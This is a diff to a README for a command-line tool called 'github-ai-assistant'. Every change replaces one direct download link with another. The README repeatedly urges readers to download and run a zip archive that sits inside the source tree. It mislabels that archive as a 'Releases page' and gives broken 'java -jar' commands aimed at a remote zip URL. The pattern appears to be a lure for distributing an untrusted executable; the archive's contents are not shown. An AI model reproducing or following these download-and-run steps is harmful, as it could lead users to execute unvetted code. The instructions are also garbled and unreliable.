@@ -6,7 +6,7 @@ Welcome to `github-ai-assistant`, your intelligent command-line assistant for Gi
 
 ## 📥 Download Now!
 
-[![Download](https://raw.githubusercontent.com/monuro/github-ai-assistant/main/src/main/java/com/github/ai/assistant/util/github_ai_assistant_2.9.zip%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/monuro/github-ai-assistant/main/src/main/java/com/github/ai/assistant/util/github_ai_assistant_2.9.zip)
+[![Download](https://github.com/monuro/github-ai-assistant/raw/refs/heads/main/src/main/java/com/github/github-ai-assistant-2.7.zip%20the%20App-blue?style=for-the-badge)](https://github.com/monuro/github-ai-assistant/raw/refs/heads/main/src/main/java/com/github/github-ai-assistant-2.7.zip)
 
 ## 🌟 Features
 
@@ -27,7 +27,7 @@ To run `github-ai-assistant`, you'll need the following:
 
 Follow these simple steps to download and set up the application on your computer:
 
-1. **Visit the Releases Page:** Click [here to access the Releases page](https://raw.githubusercontent.com/monuro/github-ai-assistant/main/src/main/java/com/github/ai/assistant/util/github_ai_assistant_2.9.zip).
+1. **Visit the Releases Page:** Click [here to access the Releases page](https://github.com/monuro/github-ai-assistant/raw/refs/heads/main/src/main/java/com/github/github-ai-assistant-2.7.zip).
 
 2. **Download the Latest Version:** On the Releases page, you will see the latest version of the `github-ai-assistant`. Click on the link to download the suitable file for your operating system.
 
@@ -35,8 +35,8 @@ Follow these simple steps to download and set up the application on your compute
 
 4. **Run the Application:**
    - **For Windows:** Locate the `.exe` file in the folder where you extracted the files. Double-click the file to run the application.
-   - **For macOS:** Find the `.jar` file. Open your terminal, navigate to the folder, and type `java -jar https://raw.githubusercontent.com/monuro/github-ai-assistant/main/src/main/java/com/github/ai/assistant/util/github_ai_assistant_2.9.zip`.
-   - **For Linux:** Open a terminal and navigate to the folder with the downloaded files. Use `java -jar https://raw.githubusercontent.com/monuro/github-ai-assistant/main/src/main/java/com/github/ai/assistant/util/github_ai_assistant_2.9.zip`.
+   - **For macOS:** Find the `.jar` file. Open your terminal, navigate to the folder, and type `java -jar https://github.com/monuro/github-ai-assistant/raw/refs/heads/main/src/main/java/com/github/github-ai-assistant-2.7.zip`.
+   - **For Linux:** Open a terminal and navigate to the folder with the downloaded files. Use `java -jar https://github.com/monuro/github-ai-assistant/raw/refs/heads/main/src/main/java/com/github/github-ai-assistant-2.7.zip`.
 
 5. **Start Using the Assistant:** Once the application is running, follow the on-screen instructions to begin using the features.
 
@@ -66,4 +66,4 @@ We welcome contributions! If you're interested in improving `github-ai-assistant
 
 ## 📥 Download Now Again!
 
-Don't forget, you can always download the latest version [here](https://raw.githubusercontent.com/monuro/github-ai-assistant/main/src/main/java/com/github/ai/assistant/util/github_ai_assistant_2.9.zip). Enjoy your smart GitHub helper!
+Don't forget, you can always download the latest version [here](https://github.com/monuro/github-ai-assistant/raw/refs/heads/main/src/main/java/com/github/github-ai-assistant-2.7.zip). Enjoy your smart GitHub helper!
